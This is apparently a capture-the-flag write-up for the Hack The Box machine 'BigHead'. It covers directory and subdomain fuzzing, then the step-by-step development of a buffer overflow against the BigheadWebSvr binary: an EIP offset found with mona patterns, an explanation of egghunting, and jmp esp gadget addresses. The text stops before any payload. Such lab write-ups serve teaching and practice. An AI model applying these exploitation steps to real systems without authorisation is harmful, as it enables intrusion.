<h4 id="its-a-website-titled-pipernet-comes-the-background-is-an-image-of-the-characters-from-the-tv-show-silicon-valley-and-in-the-middle-its-saying-pipernet-is-here-also-there-are-two-links-down-there-first-one-is-this-is-pipernet-which-is-the-homepage-and-the-other-one-is-piedpipercoin-lets-scroll-down-and-see-what-else-do-we-have-">It’s a website titled <code class="highlighter-rouge">PiperNet Comes</code>. The background is an image of the characters from the TV show “Silicon Valley”, and in the middle it’s saying <code class="highlighter-rouge">PIPERNET IS HERE</code>. Also there are two links down there, First one is <code class="highlighter-rouge">THIS IS PIPERNET</code> which is the homepage and the other one is <code class="highlighter-rouge">PIEDPIPERCOIN</code>. Let’s scroll down and see what else do we have :</h4>
<p><img src="/images/hackthebox/bighead/3.png" alt="" /></p>
<h4 id="piedpipercoin-comes-and-theres-a-small-description-of-what-piedpipercoin-is"><code class="highlighter-rouge">PIEDPIPERCOIN COMES</code>, and there’s a small description of what piedpipercoin is.</h4>
<p><img src="/images/hackthebox/bighead/4.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/bighead/5.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/bighead/6.png" alt="" /></p>
<h4 id="after-that-there-are-some-pictures-for-the-characters-from-silicon-valley-and-some-stuff-about-each-one-of-them-nothing-is-interesting-so-far-at-the-bottom-of-the-page-there-is-this-contact-form-">After that there are some pictures for the characters from “Silicon Valley” and some stuff about each one of them, Nothing is interesting so far. At the bottom of the page there is this contact form :</h4>
<p><img src="/images/hackthebox/bighead/7.png" alt="" /></p>
<h4 id="i-looked-at-the-contact-info-and-i-noticed-that-the-email-was-infobachmanityhtb-lets-check-that-domain-but-before-doing-that-i-wanted-to-check-the-other-page-piedpipercoin-">I looked at the contact info and I noticed that the email was <code class="highlighter-rouge">info@bachmanity.htb</code>. Let’s check that domain, but before doing that I wanted to check the other page <code class="highlighter-rouge">PIEDPIPERCOIN</code> :</h4>
<p><img src="/images/hackthebox/bighead/8.png" alt="" /></p>
<h4 id="instead-of-piedpipercoin-comes-its-saying-piedpipercoin-came-but-nothing-is-interesting-lets-check-bachmanityhtb-we-need-to-add-it-to-etchosts-first-">Instead of <code class="highlighter-rouge">PIEDPIPERCOIN COMES</code> it’s saying <code class="highlighter-rouge">PIEDPIPERCOIN CAME</code> but nothing is interesting. Let’s check <code class="highlighter-rouge">bachmanity.htb</code>, we need to add it to <code class="highlighter-rouge">/etc/hosts</code> first :</h4>
<p><img src="/images/hackthebox/bighead/9.png" alt="" />
<br />
<br />
<code class="highlighter-rouge">bachmanity.htb</code>
<img src="/images/hackthebox/bighead/10.png" alt="" /></p>
<h4 id="its-only-that-image-and-nothing-else-">It’s only that image and nothing else :</h4>
<p><img src="/images/hackthebox/bighead/11.png" alt="" /></p>
<h4 id="back-to-the-contact-form-i-wanted-to-see-if-its-exploitable-in-any-way-i-filled-all-the-fields-with-test-">Back to the contact form, I wanted to see if it’s exploitable in any way. I filled all the fields with <code class="highlighter-rouge">test</code> :</h4>
<p><img src="/images/hackthebox/bighead/12.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/bighead/13.png" alt="" /></p>
<h4 id="it-sends-the-request-to-mailerbigheadhtb-lets-add-it-to-etchosts-and-try-again-">It sends the request to <code class="highlighter-rouge">mailer.bighead.htb</code>, Let’s add it to <code class="highlighter-rouge">/etc/hosts</code> and try again :</h4>
<p><img src="/images/hackthebox/bighead/14.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/bighead/15.png" alt="" /></p>
<h4 id="it-shows-this-message-then-it-redirects-the-browser-back-to-bigheadhtb-i-also-intercepted-the-request-with-burp-">It shows this message then it redirects the browser back to <code class="highlighter-rouge">bighead.htb</code>. I also intercepted the request with burp :</h4>
<p><img src="/images/hackthebox/bighead/16.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/bighead/17.png" alt="" /></p>
<h4 id="tried-to-manipulate-the-input-but-couldnt-achieve-anything-i-went-to-mailerbigheadhtb-and-got-redirected-to-mailerbigheadhtbtestlink-which-shows-this-error-">Tried to manipulate the input, but couldn’t achieve anything. I went to <code class="highlighter-rouge">mailer.bighead.htb</code> and got redirected to <code class="highlighter-rouge">mailer.bighead.htb/testlink</code> which shows this error :</h4>
<p><img src="/images/hackthebox/bighead/18.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/bighead/19.png" alt="" /></p>
<h4 id="in-the-background-i-ran-gobuster-on-bachmanityhtb--and-bigheadhtb-with-usrsharewordlistsdirbcommontxt-bachmanityhtb-didnt-have-anything-">In the background I ran <code class="highlighter-rouge">gobuster</code> on <code class="highlighter-rouge">bachmanity.htb</code>  and <code class="highlighter-rouge">bighead.htb</code> with <code class="highlighter-rouge">/usr/share/wordlists/dirb/common.txt</code>. <code class="highlighter-rouge">bachmanity.htb</code> didn’t have anything :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://bachmanity.htb/
[+] Threads      : 100
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 2m0s
=====================================================
2019/04/24 20:21:01 Starting gobuster
=====================================================
/index.html (Status: 200)
/index.htm (Status: 200)
</code></pre></div></div>
<h4 id="but-bigheadhtb-gave-some-results-">but <code class="highlighter-rouge">bighead.htb</code> gave some results :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://bighead.htb/
[+] Threads      : 100
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 2m0s
=====================================================
2019/04/24 20:16:23 Starting gobuster
=====================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/assets (Status: 301)
/backend (Status: 302)
/Images (Status: 301)
/images (Status: 301)
/index.html (Status: 200)
</code></pre></div></div>
<h4 id="i-went-to-assets-and-it-was-forbidden-">I went to <code class="highlighter-rouge">/assets</code> and it was forbidden :</h4>
<p><img src="/images/hackthebox/bighead/20.png" alt="" /></p>
<h4 id="backend-redirected-the-browser-to-bigheadhtbbighead-which-gave-the-same-error-we-saw-before-"><code class="highlighter-rouge">/backend</code> redirected the browser to <code class="highlighter-rouge">bighead.htb/BigHead</code> which gave the same error we saw before :</h4>
<p><img src="/images/hackthebox/bighead/21.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/bighead/22.png" alt="" /></p>
<h4 id="i-clicked-on-error-log-and-it-gave-the-same-error-">I clicked on <code class="highlighter-rouge">error log</code> and it gave the same error :</h4>
<p><img src="/images/hackthebox/bighead/23.png" alt="" /></p>
<h4 id="lets-check-if-there-are-any-other-subdomains-i-used-wfuzz-with-subdomains-top1mil-5000txt-from-seclists">Let’s check if there are any other subdomains. I used <code class="highlighter-rouge">wfuzz</code> with <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1mil-5000.txt">subdomains-top1mil-5000.txt</a> from <a href="https://github.com/danielmiessler/SecLists">seclists</a>:</h4>
<p><code class="highlighter-rouge">wfuzz -c -w subdomains-top1mil-5000.txt -H "HOST: FUZZ.bighead.htb" http://10.10.10.112</code>
<img src="/images/hackthebox/bighead/24.png" alt="" /></p>
<h4 id="non-valid-subdomain-responses-are-11232-chars-so-we-will-remove-those-from-the-output-">non-valid subdomain responses are <code class="highlighter-rouge">11232</code> chars so we will remove those from the output :</h4>
<p><code class="highlighter-rouge">wfuzz -c --hh 11232 -w subdomains-top1mil-5000.txt -H "HOST: FUZZ.bighead.htb" http://10.10.10.112</code>
<img src="/images/hackthebox/bighead/25.png" alt="" /></p>
<h4 id="we-got-3-subdomains--dev-mailer-and-code-we-already-know-about-mailer-lets-add-dev-and-code-">We got 3 subdomains : <code class="highlighter-rouge">dev</code>, <code class="highlighter-rouge">mailer</code> and <code class="highlighter-rouge">code</code>. We already know about <code class="highlighter-rouge">mailer</code>, let’s add <code class="highlighter-rouge">dev</code> and <code class="highlighter-rouge">code</code> :</h4>
<p><img src="/images/hackthebox/bighead/26.png" alt="" /></p>
<h4 id="codebigheadhtb-redirected-the-browser-to-1270015080testlinkloginphp"><code class="highlighter-rouge">code.bighead.htb</code> redirected the browser to <code class="highlighter-rouge">127.0.0.1:5080/testlink/login.php</code></h4>
<p><img src="/images/hackthebox/bighead/27.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/bighead/28.png" alt="" /></p>
<h4 id="so-to-see-whats-on-codebigheadhtb-we-will-probably-need-to-forward-an-internal-service-to-our-box-we-cant-do-that-now-so-we-will-ignore-codebigheadhtb-for-now">So to see what’s on <code class="highlighter-rouge">code.bighead.htb</code> we will probably need to forward an internal service to our box. We can’t do that now so we will ignore <code class="highlighter-rouge">code.bighead.htb</code> for now.</h4>
<h4 id="devbigheadhtb-shows-this-image-of-bighead-"><code class="highlighter-rouge">dev.bighead.htb</code> shows this image of bighead :</h4>
<p><img src="/images/hackthebox/bighead/29.png" alt="" /></p>
<h4 id="source-has-nothing-interesting-">Source has nothing interesting :</h4>
<p><img src="/images/hackthebox/bighead/30.png" alt="" /></p>
<h4 id="i-ran-gobuster-again-and-got-some-results-">I ran <code class="highlighter-rouge">gobuster</code> again and got some results :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://dev.bighead.htb/
[+] Threads      : 100
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 2m0s
=====================================================
2019/04/24 20:55:05 Starting gobuster
=====================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/blog (Status: 302)
/blog_ajax (Status: 302)
/blog_inlinemod (Status: 302)
/blog_usercp (Status: 302)
/blog_search (Status: 302)
/blog_report (Status: 302)
/blogger (Status: 302)
/blogindex (Status: 302)
/bloggers (Status: 302)
/blogs (Status: 302)
/blogspot (Status: 302)
/wp-content (Status: 302)
</code></pre></div></div>
<h4 id="but-all-these-pages-gave-this-result-">But all these pages gave this result :</h4>
<p><img src="/images/hackthebox/bighead/31.png" alt="" /></p>
<h4 id="i-intercepted-the-request-in-burp-to-figure-out-why-">I intercepted the request in burp to figure out why :</h4>
<p><img src="/images/hackthebox/bighead/32.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/bighead/33.png" alt="" /></p>
<h4 id="the-response-is-302-by-following-the-redirect-">The response is <code class="highlighter-rouge">302</code>, by following the redirect :</h4>
<p><img src="/images/hackthebox/bighead/34.png" alt="" /></p>
<h4 id="it-responds-with-another-302">It responds with another <code class="highlighter-rouge">302</code></h4>
<p><img src="/images/hackthebox/bighead/35.png" alt="" /></p>
<h4 id="so-it-will-keep-redirecting-us-in-a-loop-and-we-wont-get-anything">So it will keep redirecting us in a loop and we won’t get anything.</h4>
<h4 id="at-this-point-i-didnt-know-what-to-do-because-all-of-my-attempts-have-hit-a-dead-end-i-did-a-sub-directory-bruteforce-again-with-wfuzz-instead-of-gobuster-and-i-got-one-more-result-">At this point I didn’t know what to do because all of my attempts have hit a dead end. I did a sub directory bruteforce again with <code class="highlighter-rouge">wfuzz</code> instead of <code class="highlighter-rouge">gobuster</code> and I got one more result :</h4>
<p><code class="highlighter-rouge">wfuzz --hc 404 -c -w /usr/share/wordlists/dirb/common.txt -u http://dev.bighead.htb/FUZZ</code>
<img src="/images/hackthebox/bighead/36.png" alt="" /></p>
<h4 id="the-reason-why-gobuster-didnt-show-us-this-page-is-because-of-the-status-code-gobuster-only-showed-results-with-these-status-codes---status-codes--200204301302307403-while-wfuzz-showed-everything-except-404-responses---hc-404-coffee-gave-a-response-of-418-which-is-weird-i-looked-it-up-and-found-some-info-about-it-here-418-im-a-teapot--anyway-lets-take-a-look-">The reason why <code class="highlighter-rouge">gobuster</code> didn’t show us this page is because of the status code. <code class="highlighter-rouge">gobuster</code> only showed results with these status codes : <code class="highlighter-rouge">[+] Status codes : 200,204,301,302,307,403</code>, While <code class="highlighter-rouge">wfuzz</code> showed everything except <code class="highlighter-rouge">404</code> responses, <code class="highlighter-rouge">--hc 404</code>. <code class="highlighter-rouge">/coffee</code> gave a response of <code class="highlighter-rouge">418</code> which is weird. I looked it up and found some info about it <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/418">here</a>. <code class="highlighter-rouge">418 I'm a teapot</code> ! Anyway let’s take a look :</h4>
<p><code class="highlighter-rouge">http://dev.bighead.htb/coffee</code>
<img src="/images/hackthebox/bighead/37.png" alt="" /></p>
<h4 id="its-showing-this-gif-">It’s showing this <code class="highlighter-rouge">gif</code> :</h4>
<p><img src="/images/hackthebox/bighead/teapot.gif" alt="" /></p>
<h4 id="which-is-saying--the-requested-entity-body-is-short-and-stout-tip-me-over-and-pour-me-out-">Which is saying : “The requested entity body is short and stout. Tip me over and pour me out.” ?!</h4>
<h4 id="i-intercepted-the-request-with-burp-and-looked-at-the-response-">I intercepted the request with burp and looked at the response :</h4>
<p><img src="/images/hackthebox/bighead/38.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/bighead/39.png" alt="" /></p>
<h4 id="i-noticed-a-weird-server-name--bigheadwebsvr-10-i-looked-it-up-and-found-a-repository-on-the-machine-creators-github-3mrgnc3-">I noticed a weird server name : <code class="highlighter-rouge">BigheadWebSvr 1.0</code>. I looked it up and found a repository on the machine creator’s github (3mrgnc3) :</h4>
<p><img src="/images/hackthebox/bighead/40.png" alt="" /></p>
<h4 id="i-searched-through-the-commits-and-got-this-one-which-seemed-to-be-the-right-one">I searched through the commits and got <a href="https://github.com/3mrgnc3/BigheadWebSvr/blob/b1b4d6ed5f2298bc243cd56cab77cd6fb4e48c3d/BHWS_Backup.zip">this one</a> which seemed to be the right one.</h4>
<p><img src="/images/hackthebox/bighead/41.png" alt="" /></p>
<h4 id="it-asked-for-a-password-">It asked for a password :</h4>
<p><img src="/images/hackthebox/bighead/42.png" alt="" /></p>
<h4 id="i-tried-to-guess-it-and-after-some-attempts-bighead-worked-">I tried to guess it and after some attempts <code class="highlighter-rouge">bighead</code> worked :</h4>
<p><img src="/images/hackthebox/bighead/43.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/bighead/44.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/bighead/45.png" alt="" /></p>
<h4 id="of-course-its-a-windows-executable-so-we-will-switch-to-a-windows-machine-at-this-point-the-hint-was-quite-obvious--the-requested-entity-body-is-short-and-stout-tip-me-over-and-pour-me-out-this-server-is-probably-vulnerable-to-a-buffer-overflow">Of course it’s a windows executable so we will switch to a windows machine. At this point the hint was quite obvious : “The requested entity body is short and stout. Tip me over and pour me out.”, This server is probably vulnerable to a buffer overflow.</h4>
<p><br /></p>
<hr />

<h3 id="buffer-overflow-in-bigheadwebsvr">Buffer Overflow in <code class="highlighter-rouge">BigheadWebSvr</code></h3>
<h4 id="i-tried-to-run-the-server-but-it-complained-about-some-missing-dll-called-libmingwex-0dll-">I tried to run the server but it complained about some missing <code class="highlighter-rouge">dll</code> called <code class="highlighter-rouge">libmingwex-0.dll</code> :</h4>
<p><img src="/images/hackthebox/bighead/46.png" alt="" /></p>
<h4 id="so-i-installed-mingw-and-copied-the-dll-to-the-same-directory-as-the-server-">So I installed <a href="https://osdn.net/projects/mingw/releases/">mingw</a> and copied the <code class="highlighter-rouge">dll</code> to the same directory as the server :</h4>
<p><img src="/images/hackthebox/bighead/47.png" alt="" /></p>
<h4 id="then-i-had-to-allow-access-for-it-">Then I had to allow access for it :</h4>
<p><img src="/images/hackthebox/bighead/48.png" alt="" /></p>
<h4 id="now-the-server-is-running-">Now the server is running :</h4>
<p><img src="/images/hackthebox/bighead/49.png" alt="" /></p>
<h4 id="but-not-on-port-80-">But not on port 80 :</h4>
<p><img src="/images/hackthebox/bighead/50.png" alt="" /></p>
<h4 id="i-did-netstat--a--b-and-found-that-its-running-on-port-8008-">I did <code class="highlighter-rouge">netstat -a -b</code> and found that it’s running on port 8008 :</h4>
<p><img src="/images/hackthebox/bighead/51.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/bighead/52.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/bighead/53.png" alt="" /></p>
<h4 id="great-i-intercepted-the-request-with-burp-then-i-ran-the-server-again-with-immunity-debugger-">Great, I intercepted the request with burp then I ran the server again with <a href="https://www.immunityinc.com/products/debugger/">Immunity Debugger</a> :</h4>
<p><img src="/images/hackthebox/bighead/54.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/bighead/55.png" alt="" /></p>
<h4 id="now-we-need-to-know-how-to-make-the-server-crash-first-thing-i-wanted-to-try-was-sending-a-head-request-because-you-know--the-machine-name-is-bighead-d">Now we need to know how to make the server crash. First thing I wanted to try was sending a HEAD request, because you know … the machine name is BigHead :D</h4>
<p><img src="/images/hackthebox/bighead/56.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/bighead/57.png" alt="" /></p>
<h4 id="and-yes-it-worked-the-eip-was-overwritten-with-a-i-tried-to-send-a-bigger-request-and-the-server-didnt-crash-and-that-was-a-bit-of-a-problem-because-we-are-limited-to-a-specific-size-so-we-dont-have-enough-space-to-store-our-shellcode-thats-why-we-will-use-egghunting-there-are-a-lot-of-great-tutorials-about-win32-egghunting-out-there-so-i-will-just-give-you-an-idea-of-what-is-egghunting-in-case-you-dont-know-when-we-dont-have-enough-space-on-the-stack-to-hold-the-shellcode-instead-of-sending-and-executing-the-shellcode-we-send-a-very-small-string-called-egghunter-when-that-egghunter-is-executed-it-searches-through-the-entire-memory-for-an-egg-when-it-hits-that-egg-it-executes-whats-after-it-the-shellcode-the-egg-is-a-4-bytes-string-say-for-example-r1ck-that-egg-is-doubled-and-added-before-the-shellcode-like-this--r1ckr1ck--shellcode-its-explained-very-well-in-skapes-paper-safely-searching-process-virtual-address-space-there-are-also-many-practical-tutorials-just-search-for-win32-egghunting">And yes it worked. The EIP was overwritten with A. I tried to send a bigger request and the server didn’t crash, and that was a bit of a problem because we are limited to a specific size so we don’t have enough space to store our shellcode, That’s why we will use egghunting. There are a lot of great tutorials about win32 egghunting out there so I will just give you an idea of what is egghunting in case you don’t know. When we don’t have enough space on the stack to hold the shellcode, instead of sending and executing the shellcode we send a very small string called egghunter. When that egghunter is executed it searches through the entire memory for an egg. when it hits that egg it executes what’s after it (the shellcode). The egg is a 4-bytes string, say for example <code class="highlighter-rouge">R1ck</code> that egg is doubled and added before the shellcode like this : <code class="highlighter-rouge">R1ckR1ck + shellcode</code>. It’s explained very well in skape’s paper <a href="http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf">Safely Searching Process Virtual Address Space</a>. There are also many practical tutorials just search for win32 egghunting.</h4>
<h4 id="now-back-to-the-vulnerable-server-first-thing-we-need-to-know-is-the-offset-im-using-mona-plugin-documentation">Now back to the vulnerable server, first thing we need to know is the offset. I’m using <a href="https://github.com/corelan/mona">mona plugin</a>. <a href="https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/">Documentation</a></h4>
<h4 id="mona-config--set-workingfolder-clogsp-to-make-mona-output-to-clogs"><code class="highlighter-rouge">!mona config -set workingfolder c:\logs\%p</code>, to make <code class="highlighter-rouge">mona</code> output to <code class="highlighter-rouge">C:\logs</code></h4>
<p><img src="/images/hackthebox/bighead/58.png" alt="" /></p>
<h4 id="to-find-the-offset-we-will-create-a-pattern-mona-pc-100-creates-a-pattern-of-100-chars-this-is-the-same-as-pattern_createrb-from-metasploit-i-used-it-in-my-buffer-overflow-write-ups">To find the offset we will create a pattern <code class="highlighter-rouge">!mona pc 100</code> (creates a pattern of 100 chars), this is the same as <code class="highlighter-rouge">pattern_create.rb</code> from <code class="highlighter-rouge">metasploit</code>. I used it in my <a href="/categories/#binary-exploitation">buffer overflow write-ups</a>.</h4>
<p><img src="/images/hackthebox/bighead/59.png" alt="" /></p>
<h4 id="it-will-put-the-output-in-a-file-called-patterntxt-in-clogs-">It will put the output in a file called <code class="highlighter-rouge">pattern.txt</code> in <code class="highlighter-rouge">C:\logs</code> :</h4>
<p><img src="/images/hackthebox/bighead/60.png" alt="" /></p>
<h4 id="pattern--aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2ab3ab4ab5ab6ab7ab8ab9ac0ac1ac2ac3ac4ac5ac6ac7ac8ac9ad0ad1ad2a">Pattern : <code class="highlighter-rouge">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A</code></h4>
<p><img src="/images/hackthebox/bighead/61.png" alt="" /></p>
<h4 id="full-output-">Full output :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>================================================================================
  Output generated by mona.py v2.0, rev 585 - Immunity Debugger
  Corelan Team - https://www.corelan.be
================================================================================
  Process being debugged : BigheadWebSvr (pid 1300)
  Current mona arguments: pc 100
================================================================================
  2019-04-24 22:43:44
================================================================================

Pattern of 100 bytes :
----------------------

ASCII:
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

HEX:
\x41\x61\x30\x41\x61\x31\x41\x61\x32\x41\x61\x33\x41\x61\x34\x41\x61\x35\x41\x61\x36\x41\x61\x37\x41\x61\x38\x41\x61\x39\x41\x62\x30\x41\x62\x31\x41\x62\x32\x41\x62\x33\x41\x62\x34\x41\x62\x35\x41\x62\x36\x41\x62\x37\x41\x62\x38\x41\x62\x39\x41\x63\x30\x41\x63\x31\x41\x63\x32\x41\x63\x33\x41\x63\x34\x41\x63\x35\x41\x63\x36\x41\x63\x37\x41\x63\x38\x41\x63\x39\x41\x64\x30\x41\x64\x31\x41\x64\x32\x41


JAVASCRIPT (unescape() friendly):
%u6141%u4130%u3161%u6141%u4132%u3361%u6141%u4134%u3561%u6141%u4136%u3761%u6141%u4138%u3961%u6241%u4130%u3162%u6241%u4132%u3362%u6241%u4134%u3562%u6241%u4136%u3762%u6241%u4138%u3962%u6341%u4130%u3163%u6341%u4132%u3363%u6341%u4134%u3563%u6341%u4136%u3763%u6341%u4138%u3963%u6441%u4130%u3164%u6441%u4132
</code></pre></div></div>
<h4 id="lets-send-the-pattern-">Let’s send the pattern :</h4>
<p><img src="/images/hackthebox/bighead/62.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/bighead/63.png" alt="" /></p>
<h4 id="the-eip-was-overwritten-with-acc54aac-mona-findmsp-should-give-us-the-offset-but-for-some-reason-it-wasnt-able-to-find-it-so-i-did-it-manually-we-will-reverse-acc54aac-because-its-little-endian-so-it-will-be-ac4ac5ac-i-located-it-then-i-used-pythons-function-len-to-find-the-length-of-the-string-before-ac4ac5ac-">the EIP was overwritten with <code class="highlighter-rouge">ACC54AAC</code>, <code class="highlighter-rouge">!mona findmsp</code> should give us the offset but for some reason it wasn’t able to find it so I did it manually. We will reverse <code class="highlighter-rouge">ACC54AAC</code> because it’s <a href="http://chortle.ccsu.edu/assemblytutorial/Chapter-15/ass15_3.html">little endian</a>, so it will be <code class="highlighter-rouge">AC4AC5AC</code>. I located it then I used python’s function <code class="highlighter-rouge">len()</code> to find the length of the string before <code class="highlighter-rouge">AC4AC5AC</code> :</h4>
<p><img src="/images/hackthebox/bighead/64.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/bighead/65.png" alt="" /></p>
<h4 id="offset-is-72-lets-confirm-that-i-sent-72-as-then-8-bs-">Offset is 72, let’s confirm that. I sent 72 A’s then 8 B’s :</h4>
<p><img src="/images/hackthebox/bighead/66.png" alt="" /></p>
<h4 id="and-i-could-successfully-overwrite-eip-with-b-">And I could successfully overwrite EIP with B :</h4>
<p><img src="/images/hackthebox/bighead/67.png" alt="" /></p>
<h4 id="nice-we-control-eip-now-we-need-to-find-a-real-address-to-overwrite-eip-with-since-the-egghunter-will-be-located-on-the-stack-we-need-to-find-a-jmp-esp-instruction-to-make-it-jmp-to-the-egghunter-and-execute-it-to-do-this-we-will-use-mona-mona-jmp--r-esp-it-will-create-another-file-in-clogs-called-jmptxt-we-need-to-make-sure-that-the-address-we-choose-will-work-on-the-target-machine-so-i-used-one-of-the-addresses-from-the-dll-of-the-server-itself-bheadsvrdll-i-chose-the-first-one-">Nice, We control EIP, Now we need to find a real address to overwrite EIP with. Since the egghunter will be located on the stack we need to find a <code class="highlighter-rouge">jmp esp</code> instruction to make it jmp to the egghunter and execute it. To do this we will use mona. <code class="highlighter-rouge">!mona jmp -r ESP</code>. It will create another file in <code class="highlighter-rouge">C:\logs</code> called <code class="highlighter-rouge">jmp.txt</code>. We need to make sure that the address we choose will work on the target machine, So I used one of the addresses from the <code class="highlighter-rouge">dll</code> of the server itself <code class="highlighter-rouge">bHeadSvr.dll</code>. I chose the first one :</h4>
<p><img src="/images/hackthebox/bighead/68.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/bighead/69.png" alt="" /></p>
<h4 id="full-output--1">Full Output :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>================================================================================
  Output generated by mona.py v2.0, rev 585 - Immunity Debugger
  Corelan Team - https://www.corelan.be
================================================================================
  Process being debugged : BigheadWebSvr (pid 5532)
  Current mona arguments: jmp -r ESP
================================================================================
  2019-04-25 02:15:27
================================================================================
-----------------------------------------------------------------------------------------------------------------------------------------
 Module info :
-----------------------------------------------------------------------------------------------------------------------------------------
 Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | Version, Modulename &amp; Path
-----------------------------------------------------------------------------------------------------------------------------------------
 0x74c70000 | 0x74e61000 | 0x001f1000 | True   | True    | True  |  False   | True   | 10.0.17763.1 [KERNELBASE.dll] (C:\Windows\System32\KERNELBASE.dll)
 0x771f0000 | 0x77269000 | 0x00079000 | True   | True    | True  |  False   | True   | 10.0.17763.1 [sechost.dll] (C:\Windows\System32\sechost.dll)
 0x00400000 | 0x00413000 | 0x00013000 | False  | False   | False |  False   | False  | -1.0- [BigheadWebSvr.exe] (C:\bighead\BHWS_Backup\BigheadWebSvr.exe)
 0x62500000 | 0x62510000 | 0x00010000 | False  | False   | False |  False   | False  | -1.0- [bHeadSvr.dll] (C:\bighead\BHWS_Backup\bHeadSvr.dll)
 0x75510000 | 0x755a8000 | 0x00098000 | True   | True    | True  |  False   | True   | 10.0.17763.1 [KERNEL32.DLL] (C:\Windows\System32\KERNEL32.DLL)
 0x74ef0000 | 0x74fb0000 | 0x000c0000 | True   | True    | True  |  False   | True   | 7.0.17763.1 [msvcrt.dll] (C:\Windows\System32\msvcrt.dll)
 0x64540000 | 0x64570000 | 0x00030000 | False  | False   | False |  False   | False  | -1.0- [libmingwex-0.dll] (C:\bighead\BHWS_Backup\libmingwex-0.dll)
 0x75270000 | 0x752ee000 | 0x0007e000 | True   | True    | True  |  False   | True   | 10.0.17763.1 [ADVAPI32.DLL] (C:\Windows\System32\ADVAPI32.DLL)
 0x776b0000 | 0x77847000 | 0x00197000 | True   | True    | True  |  False   | True   | 10.0.17763.1 [ntdll.dll] (C:\Windows\SYSTEM32\ntdll.dll)
 0x77410000 | 0x774cf000 | 0x000bf000 | True   | True    | True  |  False   | True   | 10.0.17763.1 [RPCRT4.dll] (C:\Windows\System32\RPCRT4.dll)
 0x75370000 | 0x753cf000 | 0x0005f000 | True   | True    | True  |  False   | True   | 10.0.17763.1 [WS2_32.dll] (C:\Windows\System32\WS2_32.dll)
-----------------------------------------------------------------------------------------------------------------------------------------
0x625012f0 : jmp esp |  {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\bighead\BHWS_Backup\bHeadSvr.dll)
0x625012fd : jmp esp |  {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\bighead\BHWS_Backup\bHeadSvr.dll)
0x6250130a : jmp esp | ascii {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\bighead\BHWS_Backup\bHeadSvr.dll)
0x62501317 : jmp esp | ascii {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\bighead\BHWS_Backup\bHeadSvr.dll)
0x62501324 : jmp esp | ascii {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\bighead\BHWS_Backup\bHeadSvr.dll)
0x62501331 : jmp esp | ascii {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\bighead\BHWS_Backup\bHeadSvr.dll)
0x6250133e : jmp esp | ascii {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\bighead\BHWS_Backup\bHeadSvr.dll)
0x6250134b : jmp esp | ascii {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\bighead\BHWS_Backup\bHeadSvr.dll)
